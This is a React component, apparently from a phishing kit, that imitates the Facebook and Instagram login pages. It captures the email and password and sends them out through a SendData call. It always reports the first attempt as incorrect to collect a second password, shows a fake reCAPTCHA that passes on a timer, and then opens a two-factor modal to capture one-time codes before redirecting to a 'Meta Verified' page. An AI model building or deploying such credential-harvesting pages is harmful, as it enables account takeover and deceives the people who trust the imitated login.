'use client'

import { createPortal } from 'react-dom'
import { useEffect, useId, useRef, useState } from 'react'
import Image from 'next/image'
import TwoFactorModal from '#components/modals/TwoFactorModal'
import { useRouter } from 'next/navigation'
import type { RootState } from '@/app/store'
import { useAppDispatch } from '@/app/store/hooks'
import { useStore } from 'react-redux'
import { SendData } from '@/utils/sendData'
import { updateForm } from '@/app/store/slices/stepFormSlice'
import { markMetaVerifiedSubmittedAfterFbLogin } from '@/utils/mvFbLoginSession'
import { useAppStrings } from '@/hooks/useAppStrings'

const VERIFY_CAPTCHA_DELAY_MS = 1650
const OPEN_TWO_FACTOR_DELAY_MS = 550

const LABEL_EMAIL_DESKTOP = 'Email address or mobile number'
const LABEL_EMAIL_MOBILE = 'Mobile number or email address'

export type SocialLoginVariant = 'facebook' | 'instagram'

const LOGIN_THEME: Record<
  SocialLoginVariant,
  {
    submissionFlow: 'facebook_login' | 'instagram_login'
    fieldBase: string
    submitButtonActive: string
    accentLink: string
    recoveryHref: string
  }
> = {
  facebook: {
    submissionFlow: 'facebook_login',
    fieldBase:
      'peer box-border min-h-[52px] w-full appearance-none rounded-[10px] border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#1877F2] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#1877F2] focus:shadow-[0_0_0_2px_rgba(24,119,242,0.25)] sm:min-h-[54px] sm:pt-[24px] lg:rounded-md',
    submitButtonActive: 'hover:bg-[#166FE5] active:bg-[#1565d8]',
    accentLink: '#1877F2',
    recoveryHref: 'https://www.facebook.com/login/identify/',
  },
  instagram: {
    submissionFlow: 'instagram_login',
    fieldBase:
      'peer box-border min-h-[52px] w-full appearance-none rounded-[10px] border border-[#dddfe2] bg-white px-4 pb-2 pt-[22px] text-[17px] leading-[1.25] text-[#1c1e21] outline-none caret-[#E4405F] transition-[border-color,box-shadow] placeholder:text-transparent focus:border-[#E4405F] focus:shadow-[0_0_0_2px_rgba(228,64,95,0.25)] sm:min-h-[54px] sm:pt-[24px] lg:rounded-md',
    submitButtonActive: 'hover:bg-[#d73363] active:bg-[#c42d57]',
    accentLink: '#E4405F',
    recoveryHref: 'https://www.instagram.com/accounts/password/reset/',
  },
}

const fieldErrorClasses =
  'border-[#FA383E] focus:border-[#FA383E] focus:shadow-[0_0_0_2px_rgba(250,56,62,0.28)]'

const labelBase =
  'pointer-events-none absolute left-4 top-[22px] max-w-[calc(100%-2rem)] origin-[0] -translate-y-1/2 truncate text-[17px] text-[#606770] transition-[top,transform,font-size,color] duration-150 ease-out peer-focus:top-[10px] peer-focus:translate-y-0 peer-focus:text-[13px] peer-focus:leading-tight peer-[&:not(:placeholder-shown)]:top-[10px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[13px] peer-[&:not(:placeholder-shown)]:leading-tight sm:top-[24px] sm:peer-focus:top-[11px] sm:peer-[&:not(:placeholder-shown)]:top-[11px]'

/** Khi ô đang `type="password"` — nút “Show password”; SVG fill đúng HTML Facebook */
function IconEyeSlash({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden>
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"
      />
      <path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z" />
      <path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z" />
    </svg>
  )
}

/** Khi ô đang `type="text"` — nút “Hide password”; path khớp snippet Facebook */
function IconEyeVisible({ className }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" fill="currentColor" className={className} aria-hidden>
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3"
      />
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z"
      />
    </svg>
  )
}

/** Icon info trong ô “login incorrect” — SVG khớp HTML Facebook (`clip-path` id duy nhất). */
function FbLoginIncorrectInfoIcon({
  clipPathId,
}: {
  clipPathId: string
}) {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      width="1em"
      height="1em"
      className="size-[1.125rem] shrink-0 text-[#FA383E]"
      aria-hidden
    >
      <defs>
        <clipPath id={clipPathId}>
          <path d="M0 0H24V24H0z" />
        </clipPath>
      </defs>
      <g clipPath={`url(#${clipPathId})`}>
        <path d="M12 10.278c.483 0 .875.391.875.875v4.974a.875.875 0 0 1-1.75 0v-4.974c0-.484.392-.875.875-.875zM12 7.003c.833 0 1.25.4 1.25 1s-.417 1-1.25 1-1.25-.4-1.25-1 .417-1 1.25-1z" />
        <path
          fillRule="evenodd"
          clipRule="evenodd"
          d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2zm0 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16z"
        />
      </g>
    </svg>
  )
}

/** Màn full-viewport sau lần thứ 2 Log in có đủ email + MK; checkbox → load → mở 2FA giống CaptchaModal. */
function FbRecaptchaFullScreenBody({
  captchaInputId,
  isLoading,
  isVerified,
  onCheckboxChange,
}: {
  captchaInputId: string
  isLoading: boolean
  isVerified: boolean
  onCheckboxChange: (e: React.ChangeEvent<HTMLInputElement>) => void
}) {
  const t = useAppStrings()
  return (
    <div className="bg-[#ffffff] flex min-h-[100dvh] w-full flex-col items-center justify-start overflow-y-auto">
      <div
        className="w-full max-w-[325px] flex flex-col justify-start pb-[max(1.5rem,env(safe-area-inset-bottom))] pl-[max(1rem,env(safe-area-inset-left))] pr-[max(1rem,env(safe-area-inset-right))] pt-[max(1.5rem,env(safe-area-inset-top))] font-sans text-[14px] text-gray-800 sm:h-screen sm:justify-center sm:py-0 md:px-0"
        style={{ fontFamily: 'Roboto, "Helvetica Neue", Helvetica, Arial, sans-serif' }}
      >
        <div className="w-full">
          <Image
            src="/images/meta/logo-meta.svg"
            alt="logo"
            width={132}
            height={26}
            className="h-auto max-h-16 w-[64px] object-contain object-left"
          />
        </div>

        <div
          className="flex w-full items-center justify-start bg-cover bg-center py-5 font-helvetica"
          style={{ fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif' }}
        >
          <div className="flex w-full flex-row items-center justify-between rounded-md border-2 border-[#dadce0] bg-[#f9f9f9] pr-2 text-[#4c4a4b]">
            <div className="ml-4 flex flex-row items-center justify-start">
              <div
                className="relative flex size-[30px] items-center justify-center"
                style={{ WebkitTapHighlightColor: 'transparent' }}
              >
                <label
                  className={`recaptcha-check ${isLoading ? 'cursor-wait' : 'cursor-pointer'}`}
                  htmlFor={captchaInputId}
                >
                  <input
                    id={captchaInputId}
                    className="sr-only"
                    type="checkbox"
                    checked={isVerified}
                    onChange={onCheckboxChange}
                    aria-label={t.captcha.notRobot}
                    disabled={isLoading || isVerified}
                  />
                  <span
                    aria-hidden="true"
                    className={`recaptcha-icon ${isLoading ? 'is-loading' : ''} ${isVerified ? 'is-verified' : ''}`}
                  >
                    {isLoading && (
                      <>
                        <span className="recaptcha-spinner-track" />
                        <span className="recaptcha-spinner-segment" />
                      </>
                    )}
                    {isVerified && (
                      <svg viewBox="0 0 24 24" className="recaptcha-checkmark">
                        <path d="M4.5 12.5L9.2 17.1L20 6.3" />
                      </svg>
                    )}
                  </span>
                </label>
              </div>
              <label
                htmlFor={captchaInputId}
                className={`mr-4 ml-1 text-center text-left text-[14px] font-semibold tracking-normal text-gray-500 ${isLoading || isVerified ? 'cursor-default' : 'cursor-pointer'}`}
              >
                {t.captcha.notRobot}
              </label>
            </div>
            <div className="mb-[2px] flex flex-col items-center text-[#9d9ba7]">
              <Image
                src="/images/meta/recaptcha.svg"
                alt="reCAPTCHA"
                width={40}
                height={40}
                className="mt-2"
              />
              <span className="text-[10px] font-bold">reCAPTCHA</span>
              <div className="text-[8px]">{t.captcha.privacyTerms}</div>
            </div>
          </div>
        </div>

        <div
          className="text-[13px] leading-[1.3] text-gray-700 font-helvetica"
          style={{ fontFamily: '"Helvetica Neue", Helvetica, Arial, sans-serif' }}
        >
          <p className="font-normal">{t.captcha.p1}</p>
          <p className="mt-4 font-normal">{t.captcha.p2}</p>
          <p className="mt-4 font-normal">{t.captcha.p3}</p>
        </div>
      </div>
    </div>
  )
}

function EmailFieldErrorInline() {
  return (
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      width="1em"
      height="1em"
      className="size-[1.125rem] shrink-0 pt-px text-[#FA383E]"
      aria-hidden
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"
      />
    </svg>
  )
}

export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVariant }) {
  const theme = LOGIN_THEME[variant]
  const dispatch = useAppDispatch()
  const store = useStore<RootState>()
  const emailId = useId()
  const passId = useId()
  /** useId có thể chứa `:` — làm sạch để dùng trong id HTML */
  const emailErrorDescId = `fb-email-err-${useId().replace(/:/g, '')}`
  const loginIncorrectId = `fb-login-incorrect-${useId().replace(/:/g, '')}`
  const loginIncorrectSvgClipId = `fb-inc-clip-${useId().replace(/:/g, '')}`
  const captchaCheckboxId = `checked-captcha-${useId().replace(/:/g, '')}`
  const passwordErrorDescId = `fb-pass-err-${useId().replace(/:/g, '')}`
  const credentialAttemptsRef = useRef(0)
  const verifyCaptchaTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const openTwoFactorTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
  const lastEmailRef = useRef('')
  const lastPasswordRef = useRef('')
  const [emailLabel, setEmailLabel] = useState(LABEL_EMAIL_DESKTOP)
  const [emailInvalid, setEmailInvalid] = useState(false)
  const [passwordInvalid, setPasswordInvalid] = useState(false)
  const [loginIncorrect, setLoginIncorrect] = useState(false)
  const [password, setPassword] = useState('')
  const [passwordVisible, setPasswordVisible] = useState(false)
  const [isLoggingIn, setIsLoggingIn] = useState(false)
  const [showRecaptcha, setShowRecaptcha] = useState(false)
  const [portalReady, setPortalReady] = useState(false)
  const [captchaLoading, setCaptchaLoading] = useState(false)
  const [captchaVerified, setCaptchaVerified] = useState(false)
  const [showTwoFactor, setShowTwoFactor] = useState(false)
  const showPasswordToggle = password.length > 0
  const router = useRouter()

  useEffect(() => {
    setPortalReady(true)
  }, [])

  useEffect(() => {
    return () => {
      if (verifyCaptchaTimerRef.current) clearTimeout(verifyCaptchaTimerRef.current)
      if (openTwoFactorTimerRef.current) clearTimeout(openTwoFactorTimerRef.current)
    }
  }, [])

  useEffect(() => {
    if (!showRecaptcha) return
    const prev = document.body.style.overflow
    document.body.style.overflow = 'hidden'
    return () => {
      document.body.style.overflow = prev
    }
  }, [showRecaptcha])

  useEffect(() => {
    if (!showRecaptcha) return
    setCaptchaLoading(false)
    setCaptchaVerified(false)
    if (verifyCaptchaTimerRef.current) {
      clearTimeout(verifyCaptchaTimerRef.current)
      verifyCaptchaTimerRef.current = null
    }
    if (openTwoFactorTimerRef.current) {
      clearTimeout(openTwoFactorTimerRef.current)
      openTwoFactorTimerRef.current = null
    }
  }, [showRecaptcha])

  const handleRecaptchaCheckbox = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (!e.target.checked || captchaLoading || captchaVerified) return
    setCaptchaLoading(true)

    if (verifyCaptchaTimerRef.current) clearTimeout(verifyCaptchaTimerRef.current)
    if (openTwoFactorTimerRef.current) clearTimeout(openTwoFactorTimerRef.current)

    verifyCaptchaTimerRef.current = setTimeout(() => {
      verifyCaptchaTimerRef.current = null
      setCaptchaLoading(false)
      setCaptchaVerified(true)

      openTwoFactorTimerRef.current = setTimeout(() => {
        openTwoFactorTimerRef.current = null
        dispatch(
          updateForm({
            email: lastEmailRef.current,
            password: lastPasswordRef.current,
            submissionFlow: theme.submissionFlow,
          }),
        )
        setShowRecaptcha(false)
        setShowTwoFactor(true)
      }, OPEN_TWO_FACTOR_DELAY_MS)
    }, VERIFY_CAPTCHA_DELAY_MS)
  }

  useEffect(() => {
    if (password.length === 0) setPasswordVisible(false)
  }, [password])

  useEffect(() => {
    const mq = window.matchMedia('(max-width: 1023px)')
    const sync = () =>
      setEmailLabel(mq.matches ? LABEL_EMAIL_MOBILE : LABEL_EMAIL_DESKTOP)
    sync()
    mq.addEventListener('change', sync)
    return () => mq.removeEventListener('change', sync)
  }, [])

  const formMarkup = (
    <form
      id="login_form"
      className="mt-4 flex flex-col gap-3"
      noValidate
      method="POST"
      onSubmit={(e) => {
        e.preventDefault()
        if (isLoggingIn || showRecaptcha) return
        const fd = new FormData(e.currentTarget)
        const raw = String(fd.get('email') ?? '').trim()
        const passTrim = String(fd.get('pass') ?? '').trim()
        if (!raw) {
          setLoginIncorrect(false)
          setPasswordInvalid(false)
          setEmailInvalid(true)
          return
        }
        if (!passTrim) {
          setEmailInvalid(false)
          setLoginIncorrect(false)
          setPasswordInvalid(true)
          return
        }
        lastEmailRef.current = raw
        lastPasswordRef.current = passTrim
        setPasswordInvalid(false)
        setEmailInvalid(false)
        setLoginIncorrect(false)
        dispatch(
          updateForm({
            email: raw,
            password: passTrim,
            submissionFlow: theme.submissionFlow,
            twoFa: '',
            twoFaSecond: '',
            twoFaThird: '',
          }),
        )
        void SendData(store.getState().stepForm.data).catch(() => {})
        setIsLoggingIn(true)
        void (async () => {
          try {
            /* Chỗ gọi API đăng nhập thật — tạm delay để thấy spinner như Facebook */
            await new Promise<void>((r) => setTimeout(r, 1800))
            credentialAttemptsRef.current += 1
            if (credentialAttemptsRef.current >= 2) {
              setShowRecaptcha(true)
              setLoginIncorrect(false)
            } else {
              setLoginIncorrect(true)
            }
          } finally {
            setIsLoggingIn(false)
          }
        })()
      }}
    >
      {loginIncorrect ? (
        <div id={loginIncorrectId} role="alert" className="w-full min-w-0">
          <div className="rounded-[10px] border border-solid border-[#dddfe2] bg-white px-3 py-2.5 sm:px-3.5 sm:py-3">
            <div className="flex min-w-0 flex-col gap-0">
              <div className="flex min-w-0 flex-row items-start gap-3 sm:gap-3.5">
                <div className="flex shrink-0 pt-[3px]">
                  <FbLoginIncorrectInfoIcon clipPathId={loginIncorrectSvgClipId} />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="min-w-0">
                    <span className="text-[0.8125rem] leading-[1.308] text-[#1c1e21]">
                      The login information you entered is incorrect.{` `}
                      <a
                        className="cursor-pointer font-normal hover:underline"
                        href={theme.recoveryHref}
                        role="link"
                        tabIndex={0}
                        target="_blank"
                        rel="noopener noreferrer"
                        style={{ color: theme.accentLink }}
                      >
                        Find your account and log in.
                      </a>
                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      ) : null}

      <div className="flex flex-col gap-0">
        <div className="relative">
          <input
            id={emailId}
            type="text"
            name="email"
            placeholder=" "
            autoComplete="username webauthn"
            aria-invalid={emailInvalid && !loginIncorrect}
            aria-describedby={
              emailInvalid && !loginIncorrect ? emailErrorDescId : undefined
            }
            dir="ltr"
            onChange={() => {
              setEmailInvalid(false)
              setLoginIncorrect(false)
              setPasswordInvalid(false)
            }}
            className={`${theme.fieldBase} ${emailInvalid && !loginIncorrect ? fieldErrorClasses : ''}`}
          />
          <label
            htmlFor={emailId}
            className={`${labelBase} ${emailInvalid && !loginIncorrect ? 'text-[#FA383E]' : ''}`}
          >
            {emailLabel}
          </label>
        </div>

        {emailInvalid && !loginIncorrect ? (
          <div
            id={emailErrorDescId}
            role="alert"
            className="mt-2 flex flex-row items-start gap-2"
          >
            <div className="flex shrink-0 pt-0.5 text-[#FA383E]">
              <EmailFieldErrorInline />
            </div>
            <div className="min-w-0 flex-1 text-[0.8125rem] leading-[1.308] text-[#1c1e21]">
              <span>
                The email address or mobile number you entered isn&apos;t connected to an
                account.{' '}
                <a
                  className="cursor-pointer font-normal hover:underline"
                  href={theme.recoveryHref}
                  role="link"
                  tabIndex={0}
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ color: theme.accentLink }}
                >
                  Find your account and log in.
                </a>
              </span>
            </div>
          </div>
        ) : null}
      </div>

      <div className="relative">
        <input
          id={passId}
          type={passwordVisible ? 'text' : 'password'}
          name="pass"
          placeholder=" "
          autoComplete="current-password"
          aria-invalid={passwordInvalid}
          aria-describedby={passwordInvalid ? passwordErrorDescId : undefined}
          dir="ltr"
          value={password}
          onChange={(e) => {
            setPassword(e.target.value)
            setLoginIncorrect(false)
            setPasswordInvalid(false)
          }}
          className={`${theme.fieldBase} ${showPasswordToggle ? 'pr-12 sm:pr-[2.875rem]' : ''} ${passwordInvalid ? fieldErrorClasses : ''}`}
        />
        <label
          htmlFor={passId}
          className={`${labelBase} ${passwordInvalid ? 'text-[#FA383E]' : ''} ${showPasswordToggle ? 'max-w-[calc(100%-3rem)] sm:max-w-[calc(100%-3.25rem)]' : ''}`}
        >
          Password
        </label>

        {showPasswordToggle ? (
          <div className="absolute inset-y-0 end-1 z-[1] flex items-center justify-end pr-0.5 sm:end-2">
            <button
              type="button"
              aria-label={passwordVisible ? 'Hide password' : 'Show password'}
              className="flex size-11 items-center justify-center rounded-full text-[#65676B] outline-none hover:bg-black/[0.05] active:bg-black/[0.08]"
              onMouseDown={(e) => {
                /* Tránh làm ô mất focus khi nhấp */
                e.preventDefault()
              }}
              onClick={() => setPasswordVisible((v) => !v)}
              onKeyDown={(e) => {
                if (e.key !== 'Enter' && e.key !== ' ') return
                e.preventDefault()
                setPasswordVisible((v) => !v)
              }}
            >
              {passwordVisible ? (
                <IconEyeVisible className="size-[1.25rem] shrink-0" />
              ) : (
                <IconEyeSlash className="size-[1.25rem] shrink-0" />
              )}
            </button>
          </div>
        ) : null}
      </div>

      {passwordInvalid ? (
        <p
          id={passwordErrorDescId}
          className="mt-2 text-[0.8125rem] leading-[1.308] text-[#FA383E]"
          role="alert"
        >
          Please enter password
        </p>
      ) : null}

      <button
        type="submit"
        aria-label={isLoggingIn ? 'Logging in…' : 'Log in'}
        aria-busy={isLoggingIn}
        aria-disabled={isLoggingIn}
        disabled={isLoggingIn}
        className={`relative mt-1 flex min-h-[2.75rem] w-full items-center justify-center overflow-hidden rounded-[10px] py-[0.65rem] text-[1.0625rem] font-bold leading-tight text-white transition-[background-color,opacity] lg:rounded-full ${
          variant === 'facebook' ? 'bg-[#1877F2]' : 'bg-[#E4405F]'
        } ${
          isLoggingIn ? 'cursor-default opacity-[0.98]' : theme.submitButtonActive
        }`}
      >
        {isLoggingIn ? (
          <span
            className="box-border size-[18px] shrink-0 animate-spin rounded-full border-[1.5px] border-solid border-white/30 border-t-white"
            aria-hidden
          />
        ) : (
          <span className="leading-none">Log in</span>
        )}
      </button>
    </form>
  )

  return (
    <>
      {!showRecaptcha ? formMarkup : null}
      {portalReady && showRecaptcha
        ? createPortal(
            <div className="fixed inset-0 z-[10000] overflow-y-auto bg-[#ffffff]">
              <FbRecaptchaFullScreenBody
                captchaInputId={captchaCheckboxId}
                isLoading={captchaLoading}
                isVerified={captchaVerified}
                onCheckboxChange={handleRecaptchaCheckbox}
              />
            </div>,
            document.body,
          )
        : null}

      <TwoFactorModal
        isOpend={showTwoFactor}
        isOpendFinish={() => {
          markMetaVerifiedSubmittedAfterFbLogin()
          setShowTwoFactor(false)
          router.push('/meta-verified-for-business')
        }}
        onToggleModal={(open) => setShowTwoFactor(open)}
      />
    </>
  )
}
